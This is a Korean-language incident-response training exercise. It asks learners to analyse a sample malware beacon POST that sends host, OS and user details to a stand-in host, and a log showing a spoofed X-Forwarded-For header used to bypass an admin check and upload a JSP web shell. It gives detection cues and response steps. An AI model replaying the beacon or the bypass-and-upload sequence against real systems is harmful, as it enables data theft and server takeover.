직원 PC 한 대에서 아래 요청이 **정확히 300초 간격으로 하루 종일** 반복됩니다. 회사 PC는 모두 윈도우 11과 최신 크롬·엣지를 씁니다. 수상한 점을 최대한 많이 찾아보세요.

```
POST /gate.php HTTP/1.1
Host: update-check-service.example.org
User-Agent: Mozila/5.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

data=aG9zdD1hZG1pbi1QQzEmb3M9V2luMTEmdXNlcj1qc21pdGg=
```

??? success "정답과 해설"
    | 단서 | 의미 |
    | --- | --- |
    | **정확히 300초 간격, 하루 종일** | **가장 중요한 단서.** 사람은 점심시간·퇴근 후까지 같은 간격으로 보내지 못함 → 프로그램이 보내는 비콘. 헤더는 위장할 수 있어도 기계적 주기는 숨기기 어려움(정교한 악성코드는 간격을 흔드는 지터(Jitter)를 넣지만 그래도 패턴이 남음) |
    | `Mozila` | `l`이 하나 빠진 오타. 진짜 브라우저는 오타를 내지 않음 |
    | `MSIE 8.0` + `Windows NT 6.1` | IE8 + 윈도우 7. 회사 환경(윈도우 11, 크롬·엣지)과 불일치 |
    | `data=` Base64 | 풀면 `host=admin-PC1&os=Win11&user=jsmith`. PC 이름·OS·사용자를 외부로 보고하는 체크인. 게다가 본문은 `Win11`, User-Agent는 윈도우 7 — 자기 모순 |
    | Referer 없음, 앞선 GET 없음 | 화면을 보지도 않고 입력값을 바로 보냄 = 프로그램 |
    | POST로 "보냄" | 받아 오는 게 아니라 밖으로 내보내는 중 |
    | `/gate.php` | 봇넷 관리 서버에서 자주 보이던 이름 |
    | `update-check-service` | 업데이트 서비스처럼 보이게 지은 서브도메인. 진짜 주인 도메인의 첫 등장 시점·등록일·평판 확인 |

    **자주 하는 실수:**

    - "**php 파일을 요청**해서 수상하다" → `.php` 자체는 정상 사이트에도 흔합니다. 수상한 건 `gate.php`라는 이름이고, 이건 파일 요청(GET)이 아니라 데이터를 **보내는** POST입니다.
    - "**도메인이 example.org**라서 수상하다" → `example.org`·`example.com`은 문서 예시용으로 표준에서 비워 둔 도메인이라 판단 근거가 아닙니다. 실무에서는 진짜 주인 도메인의 평판과 나이를 봅니다.
    - "**User-Agent에 Mozila/5.0밖에 없다**" → 괄호 안까지 읽어야 합니다. 오타, IE8, 윈도우 7 세 가지 단서가 다 거기 있습니다.
    - **주기를 놓침** → 요청 한 줄이 아니라 패턴을 봐야 합니다.

    **다음 행동:** PC 격리 → **어떤 프로그램이 이 연결을 만들었는지** 확인(EDR 또는 **Sysmon Event ID 3**: "네트워크 연결" 이벤트로, 어떤 실행 파일이 어느 IP·포트로 연결했는지 기록. 정상이면 `chrome.exe`·`msedge.exe`, 비콘이면 `C:\Users\jsmith\AppData\Roaming\...\update.exe` 같은 낯선 위치의 프로그램) → 같은 도메인으로 연결하는 다른 PC 찾기 → 도메인 차단. [Compromised workstation 플레이북](../../../playbooks/compromised-workstation.md) 참고.

### 문제 3

우리 웹 서버 앞에는 로드밸런서(`10.0.0.5`)가 있고, 로드밸런서는 XFF 뒤에 진짜 접속 IP를 덧붙입니다. 웹 서버 로그에서 이 요청을 발견했습니다.

```
client IP:        10.0.0.5
request:          PUT /admin/upload/report.jsp HTTP/1.1
X-Forwarded-For:  127.0.0.1, 203.0.113.77
response status:  201
```

(a) 진짜 공격자 IP는 무엇이고, `127.0.0.1`은 왜 믿으면 안 됩니까? (b) `201`과 `report.jsp`를 함께 보면 무슨 일이 일어났을 가능성이 크고, 다음으로 무엇을 확인해야 합니까?

??? success "정답과 해설"
    **(a)** 진짜 IP는 우리 로드밸런서가 마지막에 덧붙인 **`203.0.113.77`**. `127.0.0.1`은 공격자가 직접 써 넣은 가짜 메모입니다.

    **(b)** `201` = "새로 만들었음(Created)" 성공 응답, `.jsp` = Java 웹 서버가 **실행하는** 파일 → **웹셸 업로드 가능성이 높습니다.**

    **놓치기 쉬운 포인트: 두 공격이 이어져 있다.** 경로가 `/admin/upload/`(관리자 전용 구역)입니다. 많은 앱은 관리자 페이지를 "서버 자신(`127.0.0.1`)이나 내부 요청만 허용"하도록 막는데, 허술한 앱은 XFF의 **맨 왼쪽 값**을 손님 IP로 믿습니다.

    ```
    Step 1: Fake X-Forwarded-For: 127.0.0.1   → bypass the admin-only check
    Step 2: PUT /admin/upload/report.jsp      → upload a server-side script
    Step 3: 201 Created                       → the file now exists on the server
    ```

    파일 이름을 `report.jsp`(보고서)처럼 평범하게 지은 것도 눈에 덜 띄려는 위장입니다.

    **다음으로 확인할 것:**

    1. 서버 디스크에 `report.jsp`가 있는지 확인. **실행하지 말고 복사본**을 떠서 내용과 해시값 보존
    2. 웹 서버 로그에서 이후 `/admin/upload/report.jsp`로 온 GET·POST 찾기 → 있으면 웹셸을 실제로 사용
    3. `203.0.113.77`의 모든 요청을 시간 순서로 정리
    4. 호스트에서 Java 웹 서버 프로세스(`java.exe`, `tomcat*.exe`)가 `cmd.exe`·`powershell.exe`를 띄운 기록(4688, Sysmon 1). 리눅스면 `java` → `sh`/`bash`
    5. 재발 방지: 불필요한 PUT 끄기, 앱이 **로드밸런서가 붙인 맨 오른쪽 값만** 믿도록 수정, 웹 서버 패치(예: Tomcat CVE-2025-24813)

    서버 격리·중지 결정은 증거 보존과 업무 영향을 함께 따져 사고 대응 절차에 맞게 내립니다. [Web shell / server 플레이북](../../../playbooks/webshell-server.md) 참고.
